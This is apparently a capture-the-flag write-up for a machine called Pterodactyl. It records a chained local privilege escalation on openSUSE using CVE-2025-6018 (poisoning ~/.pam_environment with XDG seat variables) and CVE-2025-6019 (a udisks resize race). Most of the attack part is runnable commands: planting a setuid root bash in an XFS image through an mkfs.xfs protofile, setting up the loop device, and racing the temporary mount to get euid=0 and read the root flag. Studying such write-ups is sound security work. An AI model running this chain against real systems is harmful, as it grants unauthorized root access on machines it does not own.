# Privilege Escalation Notes - Pterodactyl

## Method: CVE-2025-6018 + CVE-2025-6019 (Chained LPE)

### Context
- Initial access: `phileasfogg3` (UID=1002) via SSH
- Target OS: openSUSE (kernel 6.4.0-150600.23.65-default, SUSE Linux Enterprise)
- Goal: root (UID=0)

---

## Phase 1: PAM Environment Poisoning (CVE-2025-6018)

### Mechanism
The `pam_env.so` module on SUSE 15 reads `~/.pam_environment` to set environment variables at login. By injecting XDG session variables that make the session appear as a local physical seat, `polkit` grants `allow_active` policy - normally reserved for users at the physical console.

### Verification
After setting ~/.pam_environment and re-logging in, confirmed:
```
env | grep XDG
XDG_VTNR=1
XDG_SESSION_ID=90
XDG_SESSION_TYPE=x11
XDG_SESSION_CLASS=user
XDG_SEAT=seat0
```

Without these env vars, `udisksctl loop-setup` returns:
```
Error: GDBus.Error:org.freedesktop.UDisks2.Error.NotAuthorizedCanObtain: Not authorized to perform operation
```

With the env vars (new SSH session), `udisksctl loop-setup` works without password.

### Commands
```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
XDG_SESSION_TYPE=x11
XDG_SESSION_CLASS=user
EOF
# Log out and log back in for vars to take effect
```

---

## Phase 2: XFS Image Creation with SUID Bash (Preparation)

### Key Challenge
The XFS root directory is owned by root:root and not writable. Standard user cannot copy files there. Solutions attempted:
- `unshare --user --mount` + `losetup`: FAILED (loop-control device not accessible in user ns)
- Direct loop mount in user namespace: FAILED (XFS mount requires real CAP_SYS_ADMIN)
- `newuidmap`/`newgidmap` for proper UID mapping: FAILED (mount still blocked)

### Working Solution: mkfs.xfs Protofile
`mkfs.xfs` supports a `-p protofile` option that pre-populates the filesystem with files **during format**. This runs as the user (UID 1002) but since the protofile specifies `uid=0 gid=0` for the bash binary, the XFS inode stores UID=0 regardless of who runs mkfs.xfs.

```bash
cat > /tmp/xfs.proto << 'PROTO'
/
0 0
d--755 0 0
bash -u-555 0 0 /bin/bash
$
$
PROTO

dd if=/dev/zero of=/tmp/xpl.img bs=1M count=300 status=none
/sbin/mkfs.xfs -f -p /tmp/xfs.proto /tmp/xpl.img
```

Result verification (after mounting): `-r-sr-xr-x 1 root root 1012656 bash`

---

## Phase 3: Loop Device Setup

```bash
udisksctl loop-setup --file /tmp/xpl.img --no-user-interaction
# Returns: Mapped file /tmp/xpl.img as /dev/loop0.
```

---

## Phase 4: Race Condition Exploit (CVE-2025-6019)

### Mechanism
When `org.freedesktop.UDisks2.Filesystem.Resize` is called via D-Bus, libblockdev internally mounts the XFS filesystem at `/tmp/blockdev.XXXXX/` WITHOUT the `nosuid,nodev` flags that are normally applied. This is a temporary maintenance mount. The race window exists between when libblockdev creates this mount and when it cleans it up.

### Exploit Commands

Terminal 1 (continuous resize trigger):
```bash
while true; do gdbus call --system \
    --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
    --method org.freedesktop.UDisks2.Filesystem.Resize \
    0 '{}' 2>/dev/null; done
```

Terminal 2 (watching for and executing SUID binary):
```bash
while true; do
    for d in /tmp/blockdev.*; do
        [ -d "$d" ] || continue
        "$d/bash" -p -c "id && cat /root/root.txt" 2>/dev/null && exit
    done
done
```

### Result
```
[HIT!] Found bash at: /tmp/blockdev.8I27L3/bash
[ROOT] id: uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
[ROOT] Reading root flag...
12768ca3a3f314e50a7d24d370b0f786
```

---

## Timeline

1. Set `~/.pam_environment` with XDG vars
2. Re-login via SSH (PAM vars activated)
3. Create XFS image with SUID bash via protofile
4. `udisksctl loop-setup` → `/dev/loop0`
5. Run race condition exploit
6. Race completed on first `blockdev.8I27L3` hit
7. Root flag captured: `12768ca3a3f314e50a7d24d370b0f786`

---

## Key Insights

1. **mkfs.xfs protofile** is the critical trick to plant SUID root files in XFS without needing root privileges to mount
2. The PAM env poisoning works on SUSE because `pam_env` reads user-controlled `~/.pam_environment` and `systemd-logind` trusts the XDG vars to determine session type
3. The race condition is reliable - on this machine it hit on the first `/tmp/blockdev.*` directory check
4. `bash -p` preserves the EUID=0 from the SUID bit, giving effective root access
